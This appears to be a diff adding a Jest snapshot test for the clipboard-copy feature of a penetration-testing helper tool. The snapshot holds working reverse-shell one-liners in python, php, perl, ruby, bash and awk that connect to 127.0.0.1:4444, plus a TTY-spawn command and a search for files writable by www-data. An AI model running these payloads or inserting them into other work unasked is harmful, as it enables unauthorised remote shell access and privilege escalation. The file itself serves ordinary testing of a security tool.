@@ -1,0 +1,46 @@
+// Jest Snapshot v1, https://goo.gl/fbAQLP
+
+exports[`copy commands can copy various strings to the clipboard 1`] = `"reverse shell (python)"`;
+
+exports[`copy commands can copy various strings to the clipboard 2`] = `"reverse shell (php)"`;
+
+exports[`copy commands can copy various strings to the clipboard 3`] = `"reverse shell (perl)"`;
+
+exports[`copy commands can copy various strings to the clipboard 4`] = `"reverse shell (ruby)"`;
+
+exports[`copy commands can copy various strings to the clipboard 5`] = `"reverse shell (bash)"`;
+
+exports[`copy commands can copy various strings to the clipboard 6`] = `"reverse shell (awk)"`;
+
+exports[`copy commands can copy various strings to the clipboard 7`] = `"spawn a TTY shell (linux)"`;
+
+exports[`copy commands can copy various strings to the clipboard 8`] = `"find files/folders with write access (linux)"`;
+
+exports[`copy commands can copy various strings to the clipboard 9`] = `
+Array [
+  Array [
+    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"127.0.0.1\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\"/bin/bash\\")'",
+  ],
+  Array [
+    "php -r '$sock=fsockopen(\\"127.0.0.1\\",4444);exec(\\"/bin/sh -i <&3 >&3 2>&3\\");'",
+  ],
+  Array [
+    "perl -e 'use Socket;$i=\\"127.0.0.1\\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");};'",
+  ],
+  Array [
+    "ruby -rsocket -e'f=TCPSocket.open(\\"127.0.0.1\\",4444).to_i;exec sprintf(\\"/bin/sh -i <&%d >&%d 2>&%d\\",f,f,f)'",
+  ],
+  Array [
+    "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
+  ],
+  Array [
+    "awk 'BEGIN {s = \\"/inet/tcp/0/127.0.0.1/4444\\"; while(42) { do{ printf \\"shell>\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \\"exit\\") close(s); }}' /dev/null",
+  ],
+  Array [
+    "python -c 'import pty;pty.spawn(\\"/bin/bash\\")",
+  ],
+  Array [
+    "find / -path /proc -prune -o '(' -type f -or -type d ')' '(' '(' -user  www-data -perm -u=w ')' -or '(' -group www-data -perm -g=w ')' -or '(' -perm -o=w ')' ')' -print 2> /dev/null",
+  ],
+]
+`;
